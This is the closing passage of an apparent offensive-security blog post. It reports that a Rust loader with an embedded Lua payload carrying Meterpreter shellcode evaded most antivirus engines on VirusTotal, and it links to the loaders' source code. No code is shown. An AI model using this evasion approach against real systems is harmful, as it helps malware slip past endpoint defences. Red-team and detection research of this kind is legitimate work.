style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> However, I think that speaks to how powerful the embedded Lua payload is! Especially considering the fact that the Meterpreter shellcode is contained in the binary, and that we are using a very basic shellcode injection method. </p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> For the final test, I wanted to see how both payloads did on <a class="link" href="https://antiscan.me/?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">antiscan.me</a>. Normally, I never upload payloads to ANY analysis site. They say they don’t distribute results, but I don’t trust it. Unfortunately, <a class="link" href="https://antiscan.me/?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">antiscan.me</a> was not working so I had to use VirusTotal which definitely distributes results (RIP payloads). </p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> The Rust baseline payload was detected by 13 vendors. </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture14.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> However, the Rust Lua loader was only detected by one. </p></div><div style="padding-left:15px;padding-right:15px;"><div style="padding-bottom:20px;padding-left:0px;padding-right:0px;padding-top:20px;"><img alt="" style="margin:0 auto 0 auto;width:100%;" src="https://www.synercomm.com/wp-content/uploads/2024/10/Picture15.png"></div></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> I was very impressed with the results and the power of Lua. Hopefully embedded Lua can serve as another tool in your offensive development arsenal. Full source code for each project is available below. </p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"><a class="link" href="https://github.com/djackreuter/rustlualoader?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">Rust Lua Loader</a>&nbsp;<a class="link" href="https://github.com/djackreuter/rustbaseline?utm_source=blog.shellntel.com&amp;utm_medium=referral&amp;utm_campaign=evading-microsoft-defender" target="_blank" style="-webkit-text-decoration:underline #0C4A6E;color:#4a90e2;font-style:italic;text-decoration:underline #0C4A6E;word-break:break-word;;">Rust Baseline</a></p></div><div style="padding-bottom:12px;padding-left:15px;padding-right:15px;padding-top:12px;"><p style="color:#eaeaea;color:var(--wt-text-on-background-color) !important;font-family:'Helvetica',Arial,sans-serif;font-size:16px;line-height:24px;text-align:left;"> Thanks for reading! </p></div></div></div></div></div></div></div></div></div></div></div><div class="px-4"></div><div id="comments" class="px-4 space-y-8"><div class="mx-auto w-full max-w-2xl pb-8" style="padding-left: 15px; padding-right: 15px;"><h4 class="pb-6 leading-none sm:pb-2 text-wt-text-on-background text-lg sm:text-xl font-bold">Keep reading</h4><div class="space-y-6"><div class="flex flex-col"><a class="group relative flex rounded-wt grid w-full grid-cols-1 transition-all hover:bg-opacity-25 sm:my-6 sm:grid-cols-2 flex-row mb-6 gap-y-0 sm:mb-0 hover:bg-slate-100/50" data-discover="true" href="https://blog.shellntel.com/p/def-con-33-and-meshtastic-on-the-lilygo-t-deck-plus"><div class="z-10 col-span-1 w-full overflow-hidden rounded-wt border bg-slate-100/50"><figure class="aspect-social relative h-full overflow-hidden w-full"><img loading="lazy" width="800" height="421" alt="DEF CON 33 and Meshtastic on the LILYGO T-Deck Plus " class="absolute inset-0 h-full w-full object-cover" src="https://media.beehiiv.com/cdn-cgi/image/format=auto,width=800,height=421,fit=scale-down,onerror=redirect/uploads/asset/file/7964a9e3-1c75-431d-9cf3-33259c3281a1/IMG_097-2.JPEG"></figure></div><div class="z-10 col-span-1 p-4"><h2 class="line-clamp-2 text-wt-text-on-background wt-header-font text-wt-text-on-background text-md font-bold">DEF CON 33 and Meshtastic on the LILYGO T-Deck Plus </h2><p class="font-regular mb-2 text-wt-text-on-background opacity-75 wt-header-font line-clamp-4 text-wt-text-on-background text-sm font-regular"></p><p class="mb-4 text-wt-text-on-background no-underline opacity-75 wt-header-font text-wt-text-on-background text-xs sm:text-sm font-regular"><span>Ryan Zagrodnik</span><span> / </span><time datetime="2025-08-28T14:41:09.515Z"></time></p></div></a><a class="group relative flex rounded-wt grid w-full grid-cols-1 transition-all hover:bg-opacity-25 sm:my-6 sm:grid-cols-2 flex-row mb-6 gap-y-0 sm:mb-0 hover:bg-slate-100/50" data-discover="true" href="https://blog.shellntel.com/p/building-a-raspberry-pi-dropbox"><div class="z-10 col-span-1 w-full overflow-hidden rounded-wt border bg-slate-100/50"><figure class="aspect-social relative h-full overflow-hidden w-full"><img loading="lazy" width="800" height="421" alt="Building a Raspberry Pi Dropbox" class="absolute inset-0 h-full w-full object-cover" src="https://media.beehiiv.com/cdn-cgi/image/format=auto,width=800,height=421,fit=scale-down,onerror=redirect/uploads/asset/file/df0396cb-f937-438f-8677-9feb52870db8/tng.jpg"></figure></div><div class="z-10 col-span-1 p-4"><h2 class="line-clamp-2 text-wt-text-on-background wt-header-font text-wt-text-on-background text-md font-bold">Building a Raspberry Pi Dropbox</h2><p class="font-regular mb-2 text-wt-text-on-background opacity-75 wt-header-font line-clamp-4 text-wt-text-on-background text-sm font-regular"></p><p class="mb-4 text-wt-text-on-background no-underline opacity-75 wt-header-font text-wt-text-on-background text-xs sm:text-sm font-regular"><span>Chad Finkenbiner</span><span> / </span><time datetime="2025-02-21T12:33:29.565Z"></time></p></div></a><a class="group relative flex rounded-wt grid w-full grid-cols-1 transition-all hover:bg-opacity-25 sm:my-6 sm:grid-cols-2 flex-row mb-6 gap-y-0 sm:mb-0 hover:bg-slate-100/50" data-discover="true" href="https://blog.shellntel.com/p/hash-master-1000-version-2-0"><div class="z-10 col-span-1 w-full overflow-hidden rounded-wt border bg-slate-100/50"><figure class="aspect-social relative h-full overflow-hidden w-full"><img loading="lazy" width="800" height="421" alt="Hash Master 1000 Version 2.0" class="absolute inset-0 h-full w-full object-cover" src="https://media.beehiiv.com/cdn-cgi/image/format=auto,width=800,height=421,fit=scale-down,onerror=redirect/uploads/asset/file/b50efc26-19fe-4ea1-bb1c-c75614f13ae5/WWHF-SynerComm-HM1K.png"></figure></div><div class="z-10 col-span-1 p-4"><h2 class="line-clamp-2 text-wt-text-on-background wt-header-font text-wt-text-on-background text-md font-bold">Hash Master 1000 Version 2.0</h2><p class="font-regular mb-2 text-wt-text-on-background opacity-75 wt-header-font line-clamp-4 text-wt-text-on-background text-sm font-regular">Tool Drop from Wild West Hackin' Fest Mile High</p><p class="mb-4 text-wt-text-on-background no-underline opacity-75 wt-header-font text-wt-text-on-background text-xs sm:text-sm font-regular"><span>Brian Judd</span><span> / </span><time datetime="2026-02-12T19:00:17.344Z"></time></p></div></a></div><button type="button" class="hover flex items-center text-sm text-wt-primary transition-all hover:font-medium"><span>View more</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" data-slot="icon" class="ml-0.5 h-3 w-3 pt-0.5"><path stroke-linecap="round" stroke-linejoin="round" d="m8.25 4.5 7.5 7.5-7.5 7.5"></path></svg></button></div></div></div></div></main></div></div><div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
<div scrolling="no" frameborder="0" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.2f70fb173b9000da126c79afe2098f02.html?origin=https%3A%2F%2Fblog.shellntel.com" title="Twitter settings iframe" style="display: none;" data-original-tag="iframe">
<title>Twitter Widget Iframe</title>



</div><div id="rufous-sandbox" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: none;" title="Twitter analytics iframe" data-original-tag="iframe"></div><div style="display: none;" data-original-tag="iframe"></div></body></html>